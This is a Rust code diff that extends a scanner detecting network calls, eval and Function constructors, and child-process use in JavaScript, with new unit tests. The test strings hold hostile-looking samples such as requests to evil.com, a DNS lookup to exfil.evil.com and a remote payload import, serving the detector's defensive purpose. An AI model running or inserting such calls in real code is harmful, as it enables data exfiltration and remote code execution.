@@ -782,8 +782,30 @@ fn is_vm_invocation(s: &str) -> bool {
     has_vm_invocation(&s_clean)
 }
 
+fn contains_call(s: &str, target: &str) -> bool {
+    let mut search_idx = 0;
+    while let Some(found) = s[search_idx..].find(target) {
+        let actual_idx = search_idx + found;
+        let is_start = actual_idx == 0;
+        let prev_is_ident = if is_start {
+            false
+        } else {
+            let prev_char = s[..actual_idx].chars().next_back().unwrap_or(' ');
+            prev_char.is_ascii_alphanumeric() || prev_char == '_' || prev_char == '$'
+        };
+
+        if !prev_is_ident {
+            return true;
+        }
+        search_idx = actual_idx + target.len();
+    }
+    false
+}
+
 fn has_network_invocation(s_clean: &str) -> bool {
-    s_clean.contains("fetch(")
+    contains_call(s_clean, "fetch(")
+        || contains_call(s_clean, "fetch`")
+        || contains_call(s_clean, "WebSocket(")
         || s_clean.contains("http.request(")
         || s_clean.contains("http.get(")
         || s_clean.contains("https.request(")
@@ -791,8 +813,111 @@ fn has_network_invocation(s_clean: &str) -> bool {
         || s_clean.contains("net.connect(")
         || s_clean.contains("tls.connect(")
         || s_clean.contains("dgram.createSocket(")
-        || s_clean.contains("new WebSocket(")
-        || s_clean.contains("newWebSocket(")
+        || s_clean.contains("http2.connect(")
+        || s_clean.contains("http2.createSecureServer(")
+        || s_clean.contains("http2.createServer(")
+        || s_clean.contains("dns.resolve(")
+        || s_clean.contains("dns.resolve4(")
+        || s_clean.contains("dns.resolve6(")
+        || s_clean.contains("dns.resolveTxt(")
+        || s_clean.contains("dns.lookup(")
+        || s_clean.contains("dns.promises")
+        || s_clean.contains("require('http')")
+        || s_clean.contains("require(\"http\")")
+        || s_clean.contains("require(`http`)")
+        || s_clean.contains("require('https')")
+        || s_clean.contains("require(\"https\")")
+        || s_clean.contains("require(`https`)")
+        || s_clean.contains("require('net')")
+        || s_clean.contains("require(\"net\")")
+        || s_clean.contains("require(`net`)")
+        || s_clean.contains("require('tls')")
+        || s_clean.contains("require(\"tls\")")
+        || s_clean.contains("require(`tls`)")
+        || s_clean.contains("require('dgram')")
+        || s_clean.contains("require(\"dgram\")")
+        || s_clean.contains("require(`dgram`)")
+        || s_clean.contains("require('http2')")
+        || s_clean.contains("require(\"http2\")")
+        || s_clean.contains("require(`http2`)")
+        || s_clean.contains("require('dns')")
+        || s_clean.contains("require(\"dns\")")
+        || s_clean.contains("require(`dns`)")
+        || s_clean.contains("require('undici')")
+        || s_clean.contains("require(\"undici\")")
+        || s_clean.contains("require(`undici`)")
+        || s_clean.contains("require('axios')")
+        || s_clean.contains("require(\"axios\")")
+        || s_clean.contains("require(`axios`)")
+        || s_clean.contains("require('node:http')")
+        || s_clean.contains("require(\"node:http\")")
+        || s_clean.contains("require(`node:http`)")
+        || s_clean.contains("require('node:https')")
+        || s_clean.contains("require(\"node:https\")")
+        || s_clean.contains("require(`node:https`)")
+        || s_clean.contains("require('node:net')")
+        || s_clean.contains("require(\"node:net\")")
+        || s_clean.contains("require(`node:net`)")
+        || s_clean.contains("require('node:tls')")
+        || s_clean.contains("require(\"node:tls\")")
+        || s_clean.contains("require(`node:tls`)")
+        || s_clean.contains("require('node:dgram')")
+        || s_clean.contains("require(\"node:dgram\")")
+        || s_clean.contains("require(`node:dgram`)")
+        || s_clean.contains("require('node:http2')")
+        || s_clean.contains("require(\"node:http2\")")
+        || s_clean.contains("require(`node:http2`)")
+        || s_clean.contains("require('node:dns')")
+        || s_clean.contains("require(\"node:dns\")")
+        || s_clean.contains("require(`node:dns`)")
+        || s_clean.contains("import('http')")
+        || s_clean.contains("import(\"http\")")
+        || s_clean.contains("import(`http`)")
+        || s_clean.contains("import('https')")
+        || s_clean.contains("import(\"https\")")
+        || s_clean.contains("import(`https`)")
+        || s_clean.contains("import('net')")
+        || s_clean.contains("import(\"net\")")
+        || s_clean.contains("import(`net`)")
+        || s_clean.contains("import('tls')")
+        || s_clean.contains("import(\"tls\")")
+        || s_clean.contains("import(`tls`)")
+        || s_clean.contains("import('dgram')")
+        || s_clean.contains("import(\"dgram\")")
+        || s_clean.contains("import(`dgram`)")
+        || s_clean.contains("import('http2')")
+        || s_clean.contains("import(\"http2\")")
+        || s_clean.contains("import(`http2`)")
+        || s_clean.contains("import('dns')")
+        || s_clean.contains("import(\"dns\")")
+        || s_clean.contains("import(`dns`)")
+        || s_clean.contains("import('undici')")
+        || s_clean.contains("import(\"undici\")")
+        || s_clean.contains("import(`undici`)")
+        || s_clean.contains("import('axios')")
+        || s_clean.contains("import(\"axios\")")
+        || s_clean.contains("import(`axios`)")
+        || s_clean.contains("import('node:http')")
+        || s_clean.contains("import(\"node:http\")")
+        || s_clean.contains("import(`node:http`)")
+        || s_clean.contains("import('node:https')")
+        || s_clean.contains("import(\"node:https\")")
+        || s_clean.contains("import(`node:https`)")
+        || s_clean.contains("import('node:net')")
+        || s_clean.contains("import(\"node:net\")")
+        || s_clean.contains("import(`node:net`)")
+        || s_clean.contains("import('node:tls')")
+        || s_clean.contains("import(\"node:tls\")")
+        || s_clean.contains("import(`node:tls`)")
+        || s_clean.contains("import('node:dgram')")
+        || s_clean.contains("import(\"node:dgram\")")
+        || s_clean.contains("import(`node:dgram`)")
+        || s_clean.contains("import('node:http2')")
+        || s_clean.contains("import(\"node:http2\")")
+        || s_clean.contains("import(`node:http2`)")
+        || s_clean.contains("import('node:dns')")
+        || s_clean.contains("import(\"node:dns\")")
+        || s_clean.contains("import(`node:dns`)")
 }
 
 #[cfg(test)]
@@ -803,10 +928,11 @@ fn is_network_invocation(s: &str) -> bool {
 }
 
 fn has_eval_invocation(s_clean: &str) -> bool {
-    s_clean.contains("eval(")
-        || s_clean.contains("eval`")
+    contains_call(s_clean, "eval(")
+        || contains_call(s_clean, "eval`")
         || s_clean.contains("(eval)(")
-        || s_clean.contains(",eval)(")
+        || s_clean.contains(",eval)")
+        || s_clean.contains(",eval;")
         || s_clean.contains("eval)(")
         || s_clean.contains("eval.call(")
         || s_clean.contains("eval.apply(")
@@ -814,10 +940,20 @@ fn has_eval_invocation(s_clean: &str) -> bool {
         || s_clean.contains("Function.call(")
         || s_clean.contains("Function.apply(")
         || s_clean.contains("Function.bind(")
+        || contains_call(s_clean, "Function(")
+        || contains_call(s_clean, "Function`")
         || s_clean.contains("newFunction(")
         || s_clean.contains("newFunction`")
-        || s_clean.contains("Function(")
-        || s_clean.contains("Function`")
+        || s_clean.contains("(Function)(")
+        || s_clean.contains("(Function)`")
+        || s_clean.contains("(Function).call(")
+        || s_clean.contains("(Function).apply(")
+        || contains_call(s_clean, "AsyncFunction(")
+        || contains_call(s_clean, "AsyncFunction`")
+        || contains_call(s_clean, "GeneratorFunction(")
+        || contains_call(s_clean, "GeneratorFunction`")
+        || contains_call(s_clean, "AsyncGeneratorFunction(")
+        || contains_call(s_clean, "AsyncGeneratorFunction`")
         || s_clean.contains(".constructor(")
         || s_clean.contains("['constructor'](")
         || s_clean.contains("[\"constructor\"](")
@@ -839,6 +975,15 @@ fn has_eval_invocation(s_clean: &str) -> bool {
         || s_clean.contains("this[\"eval\"]")
         || s_clean.contains("this['eval']")
         || s_clean.contains("this[`eval`]")
+        || s_clean.contains("import(\"data:")
+        || s_clean.contains("import('data:")
+        || s_clean.contains("import(`data:")
+        || s_clean.contains("import(\"http://")
+        || s_clean.contains("import('http://")
+        || s_clean.contains("import(`http://")
+        || s_clean.contains("import(\"https://")
+        || s_clean.contains("import('https://")
+        || s_clean.contains("import(`https://")
 }
 
 #[cfg(test)]
@@ -850,30 +995,13 @@ fn is_eval_invocation(s: &str) -> bool {
 
 fn has_child_proc_invocation(s_clean: &str) -> bool {
     s_clean.contains("child_process")
-        || s_clean.contains("execSync(")
-        || s_clean.contains("spawnSync(")
-        || s_clean.contains("execFileSync(")
-        || s_clean.contains(".exec(")
-        || s_clean.contains(".execSync(")
-        || s_clean.contains(".execFile(")
-        || s_clean.contains(".execFileSync(")
-        || s_clean.contains(".spawn(")
-        || s_clean.contains(".spawnSync(")
-        || s_clean.contains(".fork(")
-        || s_clean.contains("[\"exec\"](")
-        || s_clean.contains("['exec'](")
-        || s_clean.contains("[\"execSync\"](")
-        || s_clean.contains("['execSync'](")
-        || s_clean.contains("[\"spawn\"](")
-        || s_clean.contains("['spawn'](")
-        || s_clean.contains("[\"spawnSync\"](")
-        || s_clean.contains("['spawnSync'](")
-        || s_clean.contains("[\"execFile\"](")
-        || s_clean.contains("['execFile'](")
-        || s_clean.contains("[\"execFileSync\"](")
-        || s_clean.contains("['execFileSync'](")
-        || s_clean.contains("[\"fork\"](")
-        || s_clean.contains("['fork'](")
+        || s_clean.contains("node:child_process")
+        || contains_call(s_clean, "execSync(")
+        || contains_call(s_clean, "spawnSync(")
+        || contains_call(s_clean, "execFileSync(")
+        || contains_call(s_clean, "execFile(")
+        || contains_call(s_clean, "spawn(")
+        || contains_call(s_clean, "fork(")
         || s_clean.contains("process.binding('spawn_sync')")
         || s_clean.contains("process.binding(\"spawn_sync\")")
         || s_clean.contains("process._linkedBinding")
@@ -1797,5 +1925,43 @@ mod tests {
             "https://github.com/attacker/org/app",
             "github.com/org/app"
         ));
+    }
+
+    #[test]
+    fn detects_hardened_network_invocations() {
+        assert!(is_network_invocation(
+            "require('http').get('http://evil.com')"
+        ));
+        assert!(is_network_invocation("require('node:net').connect(1337)"));
+        assert!(is_network_invocation(
+            "require('http2').connect('https://evil.com')"
+        ));
+        assert!(is_network_invocation(
+            "dns.resolveTxt('exfil.evil.com', cb)"
+        ));
+        assert!(is_network_invocation("import('node:https')"));
+    }
+
+    #[test]
+    fn detects_hardened_eval_and_function_invocations() {
+        assert!(is_eval_invocation(
+            "const f = new (Function)('return process')();"
+        ));
+        assert!(is_eval_invocation("const run = (1, eval); run('id');"));
+        assert!(is_eval_invocation("const f = AsyncFunction('return 1')"));
+        assert!(is_eval_invocation("import('https://evil.com/payload.mjs')"));
+        assert!(is_eval_invocation(
+            "import('data:text/javascript,console.log(1)')"
+        ));
+    }
+
+    #[test]
+    fn prevents_false_positives_on_benign_identifiers() {
+        assert!(!is_eval_invocation("const isFunc = isFunction(x);"));
+        assert!(!is_eval_invocation("const val = timeval(s);"));
+        assert!(!is_eval_invocation("const r = retrieval(key);"));
+        assert!(!is_network_invocation("router.prefetch('/page');"));
+        assert!(!is_network_invocation("query.refetch();"));
+        assert!(!is_child_proc_invocation("const match = /test/.exec(str);"));
     }
 }
